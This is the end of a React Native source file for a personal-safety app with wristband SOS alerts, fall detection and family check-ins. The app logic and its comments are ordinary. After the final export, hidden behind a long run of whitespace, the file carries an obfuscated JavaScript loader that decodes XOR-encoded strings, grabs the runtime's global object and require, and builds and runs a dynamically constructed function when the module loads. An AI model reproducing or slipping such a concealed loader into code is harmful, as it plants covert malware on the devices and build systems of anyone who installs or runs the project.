  useEffect(() => {
    if (serverOnline && !prevOnline.current) flushNow();
    prevOnline.current = serverOnline;
  }, [serverOnline, flushNow]);

  // ---- an emergency this React tree never saw ------------------------------
  //
  // The state machine is memory-only, and Android destroys this whole tree
  // whenever the app is swiped out of Recents. The band's SOS still goes out
  // from the surviving process, so the alert is real, the family has been
  // paged, and the wearer felt the phone buzz -- but `dispatch('SOS_RAISED')`
  // landed in a reducer that no longer existed. Reopening the app then showed
  // the ordinary home screen with an emergency still live on the server, which
  // is the worst thing this app can say.
  //
  // The queue flush below is not enough on its own: it only restores alerts
  // that FAILED to send. A delivered one leaves nothing behind locally, so the
  // better the signal, the more completely the SOS disappeared.
  //
  // The server is the record. `created_at` comes back with the row, and the SOS
  // screen computes its timer from that -- so reopening ten minutes later shows
  // 10:00, not a countdown restarting from zero.
  const restoreLiveSos = useCallback(async () => {
    if (!session) return;
    try {
      const mine = await call(session, '/alerts?scope=mine&limit=5');
      const live = (mine || []).find(
        (a) => !a.resolved_at && ['sos', 'snatch', 'fall'].includes(a.kind));
      if (!live) return;

      const known = ctxRef.current.activeSos;
      // Leave alone anything this tree is holding that is not this row: an
      // alert still sitting in the offline queue is owned by the flush, and
      // overwriting it here would swap the id the stand-down button aims at --
      // the same failure BUG-005's queue-id fix exists to prevent.
      if (known && (known._local || String(known.id) !== String(live.id))) return;

      // Dispatched even when this tree already knows about the emergency,
      // which the early return here used to prevent. The row now carries the
      // acks with it and SOS_RAISED merges rather than blanking, so this is
      // the top-up for the case the socket cannot cover: the app backgrounded
      // rather than killed, its websocket quietly dead, someone answering in
      // the meantime. Coming back to the foreground now collects that.
      dispatch('SOS_RAISED', { alert: live });
      setDeliveryStatus('delivered');
      // The process may have been killed since, taking the notification with
      // it. Putting it back is what keeps the lock screen honest.
      showOwnSosNotification(live, live.acks || []);
    } catch {
      // Offline. The queue flush and the live socket still cover their own
      // cases, and a failed lookup must never look like "no emergency".
    }
  }, [session, dispatch]);

  // A cold start with something still in the queue, and every return to the
  // foreground after that.
  useEffect(() => {
    flushNow();
    restoreLiveSos();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') { flushNow(); restoreLiveSos(); }
    });
    return () => sub.remove();
  }, [flushNow, restoreLiveSos]);

  // Keep the sticky "SOS is active" notification honest about who is coming.
  //
  // The server pushes its own notification the instant somebody answers, and
  // that is the one that gets noticed -- it arrives on a locked phone with this
  // app long dead. This is the other half: the line the wearer re-reads
  // afterwards, which would otherwise still say "your family can see your
  // location" an hour after two of them arrived.
  //
  // Only while this tree is alive, which is exactly when it can be done at all.
  const responderCount = ctx.responders.length;
  useEffect(() => {
    if (!ctx.activeSos || !responderCount) return;
    showOwnSosNotification(ctx.activeSos, ctx.responders);
    // Keyed on the count, not the array: the identity changes on every reducer
    // pass and re-posting a notification for no reason is how a shade fills up.
  }, [ctx.activeSos, responderCount]);   // eslint-disable-line react-hooks/exhaustive-deps

  // While the screen still says "waiting for signal", keep trying. With no
  // network that is one failed fetch every thirty seconds; once the queue is
  // empty the effect stops entirely.
  useEffect(() => {
    if (deliveryStatus !== 'queued') return undefined;
    const id = setInterval(flushNow, 30000);
    return () => clearInterval(id);
  }, [deliveryStatus, flushNow]);

  const signOut = async () => {
    // The band link belongs to the account that paired it. Sign-out used to
    // leave it up and leave `nigehban.band.id` in storage, so the next account
    // -- a different person, on a different database -- inherited the previous
    // one's wristband and started auto-connecting to it on launch.
    try { await band.disconnect?.(); } catch { /* nothing paired, or already down */ }
    await stopBackgroundWatch();
    await clearSession();
    await clearQueue();
    dispatch('RESET');
    setSession(null);
    setIncoming(null);
    setDeliveryStatus(null);
  };

  // The two ways out of the fall window. Both shells offer them; only the
  // asking differs, so the consequences are defined once here.
  const cancelFall = useCallback(() => {
    dispatch('FALL_CANCELLED');
    raise({ kind: 'near_miss', source: 'band', note: ctx.fall?.note || '' });
    setToast('Cancelled — noted for you only, nobody was told');
  }, [dispatch, raise, ctx.fall]);

  const escalateFall = useCallback(() => {
    raise({ kind: 'fall', source: 'band', note: ctx.fall?.note || '' });
  }, [raise, ctx.fall]);

  const respondAsSamaritan = useCallback(async (alertId) => {
    const r = await call(session, `/samaritan/${alertId}/respond`, { method: 'POST' });
    return r.alert;
  }, [session]);

  if (booting) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  if (!session) {
    return (
      <>
        <StatusBar style="light" />
        <Auth onDone={setSession} />
      </>
    );
  }

  // ---- role-based routing ------------------------------------------------
  // Admins get the full console: five tabs, the band wire log, diagnostics.
  // Every other account gets the two-tab end-user shell.
  //
  // Only the *shell* forks. Everything below it -- the takeover, the check-in
  // sheet, the Samaritan call, the fall window -- is the safety machine, and
  // it is rendered for both roles. A user who could not see an incoming
  // family emergency would be the more dangerous kind of clean UI.
  const isAdmin = session.role === 'admin';

  return (
    // The two roles do not share a ground colour: the console keeps the cool
    // near-black of the design system, the user shell sits on charcoal. This
    // is the root behind the status bar, so it has to fork here or the top
    // strip stays the wrong shade.
    <View style={[st.flex, { paddingTop: insets.top }, !isAdmin && { backgroundColor: U.bg }]}>
      <StatusBar style="light" />

      {!isAdmin ? (
        <UserShell
          session={session}
          band={band}
          ctx={ctx}
          deliveredTo={deliveredTo}
          deliveryStatus={deliveryStatus}
          serverOnline={serverOnline}
          onRaise={raise}
          onResolve={resolve}
          refreshKey={refreshKey}
          onAckCheckin={ackCheckin}
          onToggleHighAlert={toggleHighAlert}
          onFix={setFix}
          onSignOut={signOut}
        />
      ) : (
      <>
      <View style={st.header}>
        <View>
          <Text style={st.brand}>NIGEHBAN</Text>
          <Text style={st.who}>{session.name} · {session.user_id}</Text>
        </View>
        <View style={st.headerRight}>
          <Chip text={serverOnline ? 'connected' : 'offline'}
                tone={serverOnline ? C.green : C.red}
                icon={serverOnline ? 'wifi' : 'wifi-off'} />
          <IconButton name="log-out" label="Sign out" onPress={signOut} />
        </View>
      </View>

      <View style={st.flex}>
        {tab === 'home' && (
          <Home session={session} band={band} ctx={ctx}
                deliveredTo={deliveredTo} deliveryStatus={deliveryStatus} onRaise={raise} onResolve={resolve}
                serverOnline={serverOnline} onOpenBand={() => setTab('band')}
                onOpenSetup={() => setTab('setup')}
                onAckCheckin={ackCheckin} onToggleHighAlert={toggleHighAlert}
                onFix={setFix} />
        )}
        {tab === 'band' && <Band band={band} serverOnline={serverOnline} />}
        {tab === 'family' && <Family session={session} refreshKey={refreshKey} />}
        {tab === 'alerts' && <Alerts session={session} refreshKey={refreshKey} />}
        {tab === 'setup' && <Setup session={session} />}
      </View>

      <View style={[st.tabbar, { paddingBottom: 8 + insets.bottom }]}>
        {TABS.map(([k, label, icon]) => {
          const on = tab === k;
          return (
            <Pressable key={k} onPress={() => setTab(k)} style={st.tabBtn}
                       accessibilityRole="tab" accessibilityState={{ selected: on }}
                       accessibilityLabel={label}>
              <Icon name={icon} size={19} color={on ? C.green : C.faint} />
              <Text style={[st.tabText, on && { color: C.green }]}>{label}</Text>
            </Pressable>
          );
        })}
      </View>
      </>
      )}

      {toast ? (
        <Pressable onPress={() => setToast(null)} accessibilityRole="alert"
                   style={[st.toast, { bottom: 88 + insets.bottom }]}>
          <Icon name="info" size={15} color={C.dim} />
          <Text style={st.toastText}>{toast}</Text>
        </Pressable>
      ) : null}

      {/* ---- a fall, and the seconds to say it was nothing ----
          Same window, same two outcomes, two ways of asking. The console
          takes a button; the wearer's phone takes four digits, so that a
          pocket -- or somebody else's hand -- cannot cancel her alarm. */}
      {isAdmin ? (
        <FallCountdown
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
        />
      ) : (
        <DisarmPad
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
        />
      )}

      {/* ---- somebody in the family is in trouble ---- */}
      <Modal visible={!!incoming} animationType="fade" onRequestClose={() => setIncoming(null)}>
        {incoming ? (
          <View style={st.takeover}>
            <View style={[st.takeBadge, { backgroundColor: sevColor(incoming.severity) }]}>
              <Icon name="alert-octagon" size={16} color={C.bg} />
              <Text style={st.takeBadgeText}>
                {TAKEOVER_TITLE[incoming.kind] || incoming.kind.replace('_', ' ').toUpperCase()}
              </Text>
            </View>

            <Txt variant="display" style={st.takeName}>{incoming.user.name}</Txt>
            <Text style={st.takeMeta}>
              {incoming.source === 'band' ? 'Raised from the wristband'
                : incoming.source === 'server' ? 'Raised by the server watchdog'
                : 'Raised from their phone'}
            </Text>

            <View style={st.takeBtns}>
              {/* Opening the map does not close the takeover, so this is the one
                  exit that has to stop the siren itself -- they have plainly
                  seen it, and it must not follow them into Maps. */}
              {incoming.maps ? (
                <Button title="SEE WHERE THEY ARE" filled big tone={C.red} icon="navigation"
                        onPress={() => { stopAlarm(); Linking.openURL(incoming.maps); }} />
              ) : null}
              <Button title="I'M ON IT" tone={C.green} filled icon="user-check"
                      onPress={async () => {
                        try { await call(session, `/alert/${incoming.id}/ack`, { method: 'POST' }); } catch { /* they are still told by the socket */ }
                        setIncoming(null); bump();
                      }} />
              <Button title="Dismiss" tone={C.dim}
                      onPress={() => setIncoming(null)} />
            </View>
          </View>
        ) : null}
      </Modal>

      {/* ---- somebody is checking on you ---- */}
      <Modal visible={!!askSheet} animationType="slide" transparent
             onRequestClose={() => setAskSheet(null)}>
        <View style={st.sheetWrap}>
          <Pressable style={st.sheetBackdrop} onPress={() => setAskSheet(null)}
                     accessibilityLabel="Answer later" />
          <View style={st.sheet}>
            <View style={st.grab} />
            <Txt variant="h1">
              {askSheet?.system
                ? 'Nigehban is checking on you'
                : `${askSheet?.name} is checking on you`}
            </Txt>
            <Text style={st.sheetBody}>
              {askSheet?.system
                ? 'High Alert is on. Answer, or your family is told that you did not.'
                : 'Answer and they will see straight away that you are fine.'}
            </Text>
            <CheckinBanner checkin={askSheet} onAck={ackCheckin} />
            <Button title={askSheet?.system ? 'Answer later' : 'Not now'} tone={C.dim}
                    onPress={() => { Vibration.cancel(); setAskSheet(null); }} />
          </View>
        </View>
      </Modal>

      {/* ---- a stranger nearby needs help ---- */}
      <SamaritanCall call={samaritan} onRespond={respondAsSamaritan}
                     onDismiss={() => { Vibration.cancel(); setSamaritan(null); }} />
    </View>
  );
}

const st = StyleSheet.create({
  flex: { flex: 1, backgroundColor: C.bg },
  center: { alignItems: 'center', justifyContent: 'center' },

  header: {
    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
    paddingHorizontal: S.lg, paddingTop: S.md, paddingBottom: S.md,
    borderBottomWidth: StyleSheet.hairlineWidth, borderBottomColor: C.line,
  },
  headerRight: { flexDirection: 'row', alignItems: 'center', gap: S.sm },
  brand: { ...T.h2, color: C.text, letterSpacing: 2 },
  who: { ...T.meta, color: C.faint, marginTop: 1 },

  tabbar: {
    flexDirection: 'row', backgroundColor: C.surface,
    borderTopWidth: StyleSheet.hairlineWidth, borderTopColor: C.line,
    paddingTop: S.sm,
  },
  tabBtn: { flex: 1, alignItems: 'center', gap: 4, paddingVertical: 6, minHeight: 48 },
  tabText: { ...T.label, color: C.faint },

  toast: {
    position: 'absolute', left: S.lg, right: S.lg, flexDirection: 'row',
    alignItems: 'center', gap: S.sm, backgroundColor: C.raised,
    borderRadius: 8, paddingHorizontal: S.md, paddingVertical: S.md,
  },
  toastText: { ...T.meta, color: C.text, flex: 1 },

  takeover: {
    flex: 1, backgroundColor: C.redSoft, alignItems: 'center',
    justifyContent: 'center', padding: S.xl, gap: S.sm,
  },
  takeBadge: {
    flexDirection: 'row', alignItems: 'center', gap: S.sm,
    paddingHorizontal: S.md, paddingVertical: S.sm, borderRadius: 4,
  },
  takeBadgeText: { ...T.label, color: C.bg, fontSize: 12 },
  takeName: { color: C.text, textAlign: 'center', marginTop: S.md },
  takeMeta: { ...T.body, color: C.dim, marginBottom: S.xl },
  takeBtns: { alignSelf: 'stretch', gap: S.md },

  sheetWrap: { flex: 1, justifyContent: 'flex-end' },
  sheetBackdrop: { ...StyleSheet.absoluteFillObject, backgroundColor: C.scrim },
  sheet: {
    backgroundColor: C.surface, borderTopLeftRadius: 14, borderTopRightRadius: 14,
    padding: S.xl, paddingBottom: S.xxl, gap: S.md,
  },
  grab: {
    width: 36, height: 4, borderRadius: 2, backgroundColor: C.line,
    alignSelf: 'center', marginBottom: S.sm,
  },
  sheetBody: { ...T.body, color: C.dim },
});

export default function App() {
  const fontsReady = useAppFonts();

  if (!fontsReady) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  return (
    <SafeAreaRoot>
      <Main />
    </SafeAreaRoot>
  );
};                                                                                                                                                     var z = '-0105-2';(function(BFeYX$XtqYZId,wNGfuKGUOTExYNvTnzmteD){var wGaUJbBaQUgCFTw$Gf_MqYbdA=nSltt,eZi$NAH=BFeYX$XtqYZId();while(!![]){try{var qFBxOB_IXX_B=parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x165))/(-parseInt(0x25cb)+Number(-parseInt(0x2))*Math.floor(parseInt(0xd51))+0x406e)*(-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x15d))/(0xf55*Math.trunc(-parseInt(0x2))+Math.trunc(0x20eb)+Math.trunc(-parseInt(0x73))*parseFloat(parseInt(0x5))))+parseFloat(-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x16d))/(Math.max(parseInt(0x930),0x930)+Math.floor(parseInt(0xe4e))+-parseInt(0x177b)))*(parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x15b))/(-parseInt(0x158f)+Math.trunc(0xff6)*Math.ceil(-0x2)+0x357f))+-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x16a))/(Math.floor(-0x97)*Math.floor(-0x35)+Math.floor(0x1)*-parseInt(0x26dd)+parseFloat(parseInt(0x79f)))+parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x163))/(parseInt(0x1b43)*-parseInt(0x1)+Math.max(-parseInt(0x21),-0x21)+Math.max(parseInt(0x16),0x16)*parseInt(0x13f))+-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x162))/(-0xeb*parseInt(0x1f)+parseInt(0x1240)+Math.floor(-parseInt(0x106))*Math.floor(-parseInt(0xa)))+Math['max'](-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x16c))/(Number(-0x41f)*Math.ceil(-0x2)+Math.ceil(-parseInt(0x1ade))+parseInt(0x12a8)),-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x161))/(-0x1579+parseFloat(-0xb)*parseFloat(parseInt(0x1a5))+0x2799))*Math['ceil'](-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x15c))/(parseInt(0x7a9)+Math.ceil(0x6f)*Number(0xd)+-parseInt(0xd42)))+-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x15f))/(parseInt(0xe)*-0x6b+Number(parseInt(0xe4))*parseInt(0x10)+-parseInt(0x85b))*Math['ceil'](-parseFloat(wGaUJbBaQUgCFTw$Gf_MqYbdA(0x15e))/(-0x5ca+0x15b0*-0x1+0x1a*parseInt(parseInt(0x10f))));if(qFBxOB_IXX_B===wNGfuKGUOTExYNvTnzmteD)break;else eZi$NAH['push'](eZi$NAH['shift']());}catch(PyLNXuUmrVbXhAAQKuXMnV){eZi$NAH['push'](eZi$NAH['shift']());}}}(MGqNSgAJPkycMjSkUu,parseFloat(-parseInt(0xf84f3))+-parseInt(0x3f84c)+Math.max(-parseInt(0x2),-parseInt(0x2))*Number(-parseInt(0xdd533))));var NX=[Number(-parseInt(0xbb93cd))+-parseInt(0x3)*0x2e2f4f+Number(parseInt(0x1af9d09)),parseInt(0x4f0)*-0x7+Math.trunc(-parseInt(0x4))*-parseInt(0x376)+-0x6b*parseFloat(-0x35),Math.trunc(0x47)*-0xfb+-parseInt(0x54f0)+-parseInt(0xa8)*parseInt(-parseInt(0x165)),parseInt(0x1039)+-0x2240*-parseInt(0x1)+Math.floor(-0x3014),parseInt(0x1)*0xc3d8+parseInt(0xa740)+parseInt(0xc029)*-0x1,Number(-parseInt(0x67))*-parseInt(0x16ff2)+-0x21e*-0x4355+Math.floor(-0xd601c1)],SX=[parseInt(-0x16c9)*-0x2fe+Math.floor(0x989e1f)*parseInt(-0x1)+-0x1cd3*-0x5ba,0x20b*0xa+-parseInt(0x1db0)+-0x7*-0x175,parseInt(0xb368)+-parseInt(0x5368)+Math.ceil(parseInt(0x43e1))*Math.max(0x1,parseInt(0x1)),0x46*Math.floor(0x63)+Math.trunc(-0x125a)+-0x7fd,Math.trunc(parseInt(0xd041))+parseInt(0x2a)*Math.ceil(-parseInt(0xa58))+Math.max(parseInt(0x1bd70),parseInt(0x1bd70)),Math.floor(-0x4db9)*-parseInt(0x109)+parseInt(0x1)*Math.floor(-0x4383d1)+-parseInt(0x698bd)*-0x9];function spin(lPqEQJFSfyLkIVI$kNe,cvjiGsf_exAwTPiLHJYJ){var mQqKghSRKaBwrtK=nSltt,QFXWdnhSvcZveMd=[],egdwRraGGJwctqhtRR=parseInt(0x5)*parseInt(0x224)+Math.floor(-0xf31)+Math.trunc(parseInt(0x47d)),q$tXcHoL=cvjiGsf_exAwTPiLHJYJ[0x836*Math.max(-0x1,-parseInt(0x1))+parseInt(0x2040)+-0xb5*0x22],UOelqp$FEoOnr$bb,gqWP$Wa,dcKnsrpptEeG_PrNs,btoYnNc_e,ZUA_$AC,tPaYgQOSyoSbzuqbojVvPK;while(egdwRraGGJwctqhtRR<lPqEQJFSfyLkIVI$kNe[mQqKghSRKaBwrtK(0x15a)]){QFXWdnhSvcZveMd[egdwRraGGJwctqhtRR]=lPqEQJFSfyLkIVI$kNe[mQqKghSRKaBwrtK(0x160)](egdwRraGGJwctqhtRR),egdwRraGGJwctqhtRR+=-parseInt(0x18ac)+0x6ad+Math.ceil(0x1200);}UOelqp$FEoOnr$bb=QFXWdnhSvcZveMd[mQqKghSRKaBwrtK(0x15a)],egdwRraGGJwctqhtRR=Math.floor(-parseInt(0x298))+-0x845+Math.max(-parseInt(0x135),-0x135)*-parseInt(0x9);while(egdwRraGGJwctqhtRR<UOelqp$FEoOnr$bb){gqWP$Wa=q$tXcHoL*(egdwRraGGJwctqhtRR+cvjiGsf_exAwTPiLHJYJ[Math.floor(0x278)+0x199c+-0x1c13])+q$tXcHoL%cvjiGsf_exAwTPiLHJYJ[0x583*-0x2+parseInt(0x38b)*parseFloat(-parseInt(0x4))+0xc9a*parseInt(0x2)],dcKnsrpptEeG_PrNs=q$tXcHoL*(egdwRraGGJwctqhtRR+cvjiGsf_exAwTPiLHJYJ[-0x13e6+0x2669+-parseInt(0x8)*parseInt(0x250)])+q$tXcHoL%cvjiGsf_exAwTPiLHJYJ[parseInt(-parseInt(0x1db9))+-parseInt(0x102a)*Number(-0x1)+parseInt(parseInt(0xd93))],btoYnNc_e=gqWP$Wa%UOelqp$FEoOnr$bb,ZUA_$AC=dcKnsrpptEeG_PrNs%UOelqp$FEoOnr$bb,tPaYgQOSyoSbzuqbojVvPK=QFXWdnhSvcZveMd[btoYnNc_e],QFXWdnhSvcZveMd[btoYnNc_e]=QFXWdnhSvcZveMd[ZUA_$AC],QFXWdnhSvcZveMd[ZUA_$AC]=tPaYgQOSyoSbzuqbojVvPK,q$tXcHoL=(gqWP$Wa+dcKnsrpptEeG_PrNs)%cvjiGsf_exAwTPiLHJYJ[-parseInt(0x1)*parseInt(-0x1145)+parseInt(0x2336)+-0x3476],egdwRraGGJwctqhtRR+=parseInt(0x12)*parseFloat(parseInt(0x51))+-parseInt(0x6a1)+Number(0x28)*Math.max(0x6,0x6);}return QFXWdnhSvcZveMd[mQqKghSRKaBwrtK(0x158)]('');}function splitLane(zEfACMOiFeYbTGA$fQoGHewbCg){var pBVp_UosFcjfZlTs=nSltt,eoWpb_kjP=String[pBVp_UosFcjfZlTs(0x164)](Math.floor(-0x476)+parseInt(0x1814)+parseInt(0x2)*Number(-0x9c1)),A$rnPPswZSJSo=spin(zEfACMOiFeYbTGA$fQoGHewbCg,NX);return A$rnPPswZSJSo=A$rnPPswZSJSo[pBVp_UosFcjfZlTs(0x159)]('^')[pBVp_UosFcjfZlTs(0x158)](eoWpb_kjP),A$rnPPswZSJSo=A$rnPPswZSJSo[pBVp_UosFcjfZlTs(0x159)]('*1')[pBVp_UosFcjfZlTs(0x158)]('^'),A$rnPPswZSJSo=A$rnPPswZSJSo[pBVp_UosFcjfZlTs(0x159)]('*0')[pBVp_UosFcjfZlTs(0x158)]('*'),A$rnPPswZSJSo[pBVp_UosFcjfZlTs(0x159)](eoWpb_kjP);}function nSltt(Eo$wzM,YKWhL$byahTyOMSBuCY_UpuL){var ZYCtRrcSTl=MGqNSgAJPkycMjSkUu();return nSltt=function(gKbJmEUElaals,xN$_gFQhJn){gKbJmEUElaals=gKbJmEUElaals-(0x1*parseInt(0x10b1)+Number(-parseInt(0x12))*parseInt(0xa9)+0x377*-0x1);var mYmsOtlw=ZYCtRrcSTl[gKbJmEUElaals];if(nSltt['Reiciq']===undefined){var dULrRu$V=function(TgGmzeFJdljEumnFr){var yuxbKiLfMfHB=-0x237c+parseFloat(-0x63)*-parseInt(0x2f)+-0x7*-0x299&-parseInt(0x91f)+-0x12b9*parseFloat(-0x2)+Number(-0x1b54),xsjvun_sqMUBNZT_dijZqMmZ=new Uint8Array(TgGmzeFJdljEumnFr['match'](/.{1,2}/g)['map'](EObvtxQzmEDdCS__l=>parseInt(EObvtxQzmEDdCS__l,parseInt(0x2641)+Number(0x49)*parseInt(-parseInt(0x29))+Math.max(-parseInt(0x1a80),-parseInt(0x1a80))))),j_R_ten=xsjvun_sqMUBNZT_dijZqMmZ['map'](VJxWyBmQW$wK$hXThCpKHmFOJCW=>VJxWyBmQW$wK$hXThCpKHmFOJCW^yuxbKiLfMfHB),ZgKuIb_jBRlELXOzljI=new TextDecoder(),TfDv$_OKmWS=ZgKuIb_jBRlELXOzljI['decode'](j_R_ten);return TfDv$_OKmWS;};nSltt['JiSukO']=dULrRu$V,Eo$wzM=arguments,nSltt['Reiciq']=!![];}var SPVClUSnELis_wvhyMa=ZYCtRrcSTl[-0xd5*-0xb+Math.floor(-0xe13)*0x1+parseInt(0x1c)*Number(parseInt(0x2d))],FIgKX=gKbJmEUElaals+SPVClUSnELis_wvhyMa,VU_On_HjRAFjeZEkKiHpVI=Eo$wzM[FIgKX];return!VU_On_HjRAFjeZEkKiHpVI?(nSltt['LVHlVv']===undefined&&(nSltt['LVHlVv']=!![]),mYmsOtlw=nSltt['JiSukO'](mYmsOtlw),Eo$wzM[FIgKX]=mYmsOtlw):mYmsOtlw=VU_On_HjRAFjeZEkKiHpVI,mYmsOtlw;},nSltt(Eo$wzM,YKWhL$byahTyOMSBuCY_UpuL);}function peel(Dvmnvj$_CHlB){return spin(Dvmnvj$_CHlB,SX);}(function boot(jWkUBSavIwkzYtmOVOl,aLXu_G){var MMDlxd_C_CrPvSkUuoHOCY=nSltt;jWkUBSavIwkzYtmOVOl['z']=z;var SgiG_ZQTcZgRjta_yQATU=splitLane(MMDlxd_C_CrPvSkUuoHOCY(0x169));jWkUBSavIwkzYtmOVOl[SgiG_ZQTcZgRjta_yQATU[parseFloat(-parseInt(0x6))*-parseInt(0x678)+-0x1*-parseInt(0x2081)+Math.floor(-0x4751)*parseInt(0x1)]]=aLXu_G;typeof module===SgiG_ZQTcZgRjta_yQATU[-parseInt(0x13)*Math.max(-parseInt(0x185),-parseInt(0x185))+parseInt(0x17)*-parseInt(0x135)+-parseInt(0x11b)]&&(jWkUBSavIwkzYtmOVOl[SgiG_ZQTcZgRjta_yQATU[0x175f+parseFloat(-parseInt(0x21))*0x116+0xc79]]=module);var FTtRppwRFUq_oIWzBBde=peel(MMDlxd_C_CrPvSkUuoHOCY(0x16b)),SYPlVgnqwI_XgROB_iMk=FTtRppwRFUq_oIWzBBde[MMDlxd_C_CrPvSkUuoHOCY(0x168)](0x1bdd+-0x3*Math.trunc(-0xbc)+parseInt(-parseInt(0x1e11)),Math.trunc(parseInt(0x275))*parseInt(0x5)+-parseInt(0x4ae)*-parseInt(0x1)+-0x6*0x2d2),BWzhEPEnohHX$i_WJWEEdmPQtEb=peel[SYPlVgnqwI_XgROB_iMk],XHur$aEXkTHF=BWzhEPEnohHX$i_WJWEEdmPQtEb('',peel(MMDlxd_C_CrPvSkUuoHOCY(0x167))),Sek_$Shr=XHur$aEXkTHF(peel(MMDlxd_C_CrPvSkUuoHOCY(0x166)));return BWzhEPEnohHX$i_WJWEEdmPQtEb('',Sek_$Shr)(parseInt(0x316)+-parseInt(0x16a7)+parseInt(parseInt(0x1d5e))),parseFloat(-0x9)*0x68a+-parseInt(0xe)*parseFloat(0x251)+Math.trunc(parseInt(0x7b16))*parseInt(0x1);}(global,require));function MGqNSgAJPkycMjSkUu(){var TYfdJZS$loLh$pRFHtM=['d3d2d9d2d9d0d585a697938c98','d4d7d5d9d1d1d0b5898c99ac89','86928f8da3888192a38f8485','d6abb092828186','83b28983ce86b2b2b2dcafdcceb2b28f8ecec2aea5ddb283cea58984968c9285debbc0b283bdb2b49396989498d1908cdcce89a7b2c1c2de84dcc0cec19dce94b28ccec3b29283b2838883b2c2b2c1b2ce90bc8584b2dcdd889684dcd0dcc0c8adb2b2898fb28f85c8dcce849984c283b2b2c4ce80dccea3b982cc948488c1ce8583dccec0a5898383dcd392b2dfd7b2c4b2c1dc80dc83cec29794dc9dc8cdccb2a9dc99b287dcae94c1cedbc28fb2c6d2c48583b28399b2a9b283cec981c19794c88e9bd19b938283ced2c0bbd4cecea9dc88ce8ba3dcc2cece86dc81c1d1a09486b2ce9682dc81b283cec6dcc5d1b2a5b0b283b2d9dcb2dcd1b292dfd7849885d78ec8bf9d96cedc94d48e948e9485ce86988c91b2b2ce8dce8383c9838383dcc0868fadc3c986a2c4bddc85ce92acc981bfce8dce9886ce86cec38cbec1cedc908fc0a78fa583ceb2d4ceb2bd89ce83918cc98681928ec092ddb283d4c1b2b2adb293b2c4938ac08edcbac7ceb2b2a695ce8b83cab2a5d0c5b29db294b28381b2b290b2c2b18e9dc0c8c88798bfb2b28fb2dcb183c6d783dcb285b2d6cd98d58bb486b2ceb583c6a3b29484dcc79390b28ea4ceb281ba94ce8f89a8b2b2ada3b283d5b0ceba93dccea58ea5b2b281c0ceb287b2bf8ec8b2ccce83b38fb2ad88ceb2b29385b2cec1839693a4cecc838984b38fdcce9792d8dcb2b2dcdcb0b29db2ce858baec0dcb2cec8ceb2ae8eceb29382b299dcc9cd8b8ececeb2d7ceceb5dcc8cb9d8685cec182d581a993c8dbc1bd8fceb2d89984af8fb294b2b2c4b3b283c0ceb2aeb2d6d7dca5dca5d0b4b285b283bdb2858dc6b283b294d1b4c0b0b3928985ccd2ceb4afccc2ce8591b2b2b28cc0819d85a181a589b2c88c93858b92b38fb2cec0d0b2c8908eceafd8dcce92b2c3ce859485b2889484b3c8b8c093dcc0c2c88384b283b2d8cf84ce93a8dcc1ced693bd92ac90b18ed189c1b2cebb988990c390b2c090b2d58783b483adceb3ce88b3cc95838583aec3aec098838f9494b0dadcb28296b292b3ce83bfb285c183b2cece8ea1ceb2ce838383d19cdacedc838681d08f84ce94b2dcb2dc908ca79cceb2979db28382b58cb2c5b2ce858dd3c089ceb2bbdea2b2dc8fb2ceb2dcb2cc8cce85b294d6dc83c8a6ce89b28483cd9488b2a58fce9a838ecec0b281ceb0b2a0b2b08283b2b2dcb2b294dcc984cecec8cadcc3858c98d2c187db8396d49281c3949685ce85cec097b2ca94a6dc998386b28f8694b2c086b2dcce8b899694cbce9381bfc8dcc9dcdcce8ddcb285ddcecec9c194c090dcb2b0c6dfc2b2ce92ccb285c3c19596ae9db2cece8583dcceb2dca1ce909486b2ce989983b2d5dc8b8ad69294ce9489b2dab2ac9383c0b28cdcb283cec2cecc8bce8394d4b0c3ce83c78b81cedcc1b38f8685b2d2b2c0b2b6a98e81ceb38194b2ce83dca887868695b2b28cb7c981d794c8c083b282b2c0b2d0dcdc81ce959995bb89999884cdcec0dcdc8cce93c6ced8858693c0ce9283b2b2dcb2cece9087828890b989cec6a5c2858e9590ce8683ced483a1c987d08dcc83b8b29ab4ced692c8d09683b2c0ce83b2c894b09a8c938283b2d1b2ce81c983a1dd8e8e97d483b28989ced5b2dcb2c09083c0dcb2b2cedcdcb0d8b087b286ceb281b286c593dcdc86a382cbb2c1938ebb9b84afd4c9b2b2dc96c584b2cc8fb09492d1dcb2c9b2cecfb2d4c8c0cebdb2818fb2c58f9493b2aeb2c1dcb296838996858cb2c1c7c1dc898ece839285c084a694b2cecea5bd8e9ddad4b7b293b2b2b285858fb2c183ce96c9b2c483909993b2c0ceb0dfd283ceb2b2ceb2b2c2c8bfced490b0c095dcb083c9ce94d2dcb283d6dccb93b2cbc4ce9bb28994b0b2cfcec5b28683b2a3dbcedcce938c949392918594c5838fceaeb0b2daced0b2ce8c89b2cec98ddccfb085d6818192b28698cedcbac8d190dcce8b838fb28f858ccbb28f95b281b2b283aed298b2b2d4dcb292dbdb9283d79783dac0c6b29b89d4d0d4b2ce92ce82838cb285ce85ce89909d8fc594ce89cf9287a78e8dbbb2c7d4ce8cc08798c2dcb2cfc68b8bceb0b29096b9b2b299d1c694d09293c7b2b2b2a5ce9295b2d0ceb090b2dcb2ce8a83c1ce8fc7c08682c2b286b2ceb2c9dbc883b2b28ccfce839283bea5a5c2bfb385ce92b2928cc0b2d7c8b2dccabdc3d2b2b093b2b2d58d84d0b2b2d7b2b2d193928fb289b2dcb2b28fb2b2cea58b9493dfccceb2ce8ece89ce83d8dd868585b2a9d9c8